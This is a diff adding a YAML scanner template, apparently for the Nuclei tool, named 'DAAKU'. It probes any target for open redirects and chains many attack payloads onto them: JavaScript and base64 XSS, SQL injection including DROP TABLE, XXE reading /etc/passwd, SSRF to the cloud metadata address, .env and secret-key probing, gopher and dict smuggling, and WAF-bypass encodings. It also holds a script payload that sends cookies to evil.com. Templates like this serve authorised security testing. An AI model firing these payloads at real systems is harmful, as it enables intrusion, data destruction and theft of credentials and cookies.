@@ -1,0 +1,217 @@
+id: ultimate-open-redirect-injector
+
+info:
+  name: DAAKU
+  author: YourUsername
+  severity: high
+  description: Comprehensive open redirect testing with multiple injection vectors
+  tags: open-redirect,injection,xss,sqli,xxe,ssrf
+
+variables:
+  payloads: |
+    [
+      "https://evil.com",
+      "//evil.com",
+      "\\/\\/evil.com",
+      "https:evil.com",
+      "javascript:alert(1)",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+      "https://{{interactsh-url}}",
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd"
+    ]
+
+requests:
+  # Open Redirect Detection
+  - method: GET
+    path:
+      - "{{BaseURL}}?next={{urlencode:https://evil.com}}"
+      - "{{BaseURL}}?redirect={{urlencode://evil.com}}"
+      - "{{BaseURL}}?url={{urlencode:\\\\evil.com}}"
+      - "{{BaseURL}}/redirect?to={{urlencode:https://evil.com}}"
+      - "{{BaseURL}}/out?link={{urlencode:https://evil.com}}"
+      
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "Location:.*evil\\.com"
+          - "Refresh:.*evil\\.com"
+          
+    extractors:
+      - type: regex
+        name: redirect_pattern
+        part: body
+        regex:
+          - "(next|redirect|url|return|out|link)=[^&\\s\"']+"
+
+  # XSS via Open Redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=javascript:alert(document.domain)"
+      - "{{BaseURL}}?redirect=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"
+      - "{{BaseURL}}?url=%0d%0aLocation:%20javascript:alert(1)"
+      
+    matchers:
+      - type: word
+        words:
+          - "alert(document.domain)"
+          - "alert(1)"
+        part: body
+
+  # SQL Injection via Redirect Parameter
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=' UNION SELECT NULL--"
+      - "{{BaseURL}}?redirect=1' AND SLEEP(5)--"
+      - "{{BaseURL}}?url=admin'--"
+      
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql_fetch"
+          - "ORA-"
+          
+  # XXE via Open Redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+      
+    headers:
+      Content-Type: application/xml
+      
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          
+  # SSRF via Open Redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}?redirect=http://localhost:8080"
+      - "{{BaseURL}}?url=http://127.0.0.1:3306"
+      
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+          
+    extractors:
+      - type: regex
+        name: internal_info
+        part: body
+        regex:
+          - "(instance-id|ami-id|local-ipv4|public-keys)"
+          - "(root:|daemon:|bin:)"
+
+  # Information Gathering via Open Redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=file:///etc/passwd"
+      - "{{BaseURL}}?redirect=php://filter/convert.base64-encode/resource=index.php"
+      - "{{BaseURL}}?url=http://localhost/.env"
+      
+    matchers:
+      - type: regex
+        regex:
+          - "DB_(PASSWORD|USERNAME|HOST)"
+          - "API_KEY"
+          - "SECRET_KEY"
+          
+  # Chained Attack: Open Redirect + Blind Injection
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=http://{{interactsh-url}}/{{urlencode:'; DROP TABLE users;--}}"
+      - "{{BaseURL}}?redirect=http://{{interactsh-url}}/{{urlencode:<script>document.location='http://evil.com?cookie='+document.cookie</script>}}"
+      
+    matchers:
+      - type: word
+        words:
+          - "Interactsh Server"
+
+  # Protocol Smuggling via Open Redirect
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=gopher://localhost:8080/_GET /admin HTTP/1.1"
+      - "{{BaseURL}}?redirect=dict://localhost:11211/stat"
+      - "{{BaseURL}}?url=ftp://ftp.example.com"
+      
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 500
+
+  # Advanced Payload Fuzzing
+  - method: GET
+    path:
+      - "{{BaseURL}}?next={{urlencode:{{payload}}}}"
+      
+    payloads:
+      payloads: 
+        - "https://evil.com#"
+        - "https://evil.com@evil.com"
+        - "https://evil.com:80"
+        - "https://evil.com/path"
+        - "https://evil.com?query=1"
+        - "//evil.com/path"
+        - "///evil.com"
+        - "https://evil.com\\\\@google.com"
+        
+    matchers:
+      - type: word
+        words:
+          - "evil.com"
+          - "Location:"
+          
+  # WAF Bypass Techniques
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=%25%33%68%25%74%25%74%25%70%25%73%25%33%61%25%32%66%25%32%66%65%76%69%6c%2e%63%6f%6d"  # URL encoded
+      - "{{BaseURL}}?redirect=//evil%E3%80%82com"  # Unicode bypass
+      - "{{BaseURL}}?url=https://evil.com#@google.com"  # Fragment bypass
+      
+    matchers:
+      - type: regex
+        regex:
+          - "Location:.*evil\\.com"
+
+  # Time-based Blind Detection
+  - method: GET
+    path:
+      - "{{BaseURL}}?next=http://localhost:8080?{{randstr}}"
+      
+    matchers:
+      - type: word
+        words:
+          - "Connection refused"
+          - "timed out"
+          
+    extractors:
+      - type: kval
+        kval:
+          - response_time
+          
+  # Automatic Report Generator
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    extractors:
+      - type: json
+        name: final_report
+        internal: true
+        json:
+          - '. | { 
+              "target": "{{BaseURL}}",
+              "open_redirects": .open_redirects,
+              "injections": .injections,
+              "info_disclosed": .info_disclosed,
+              "severity": "high",
+              "impact": "Multiple vulnerabilities chained via open redirect",
+              "remediation": "Validate and sanitize all redirect parameters"
+            }'
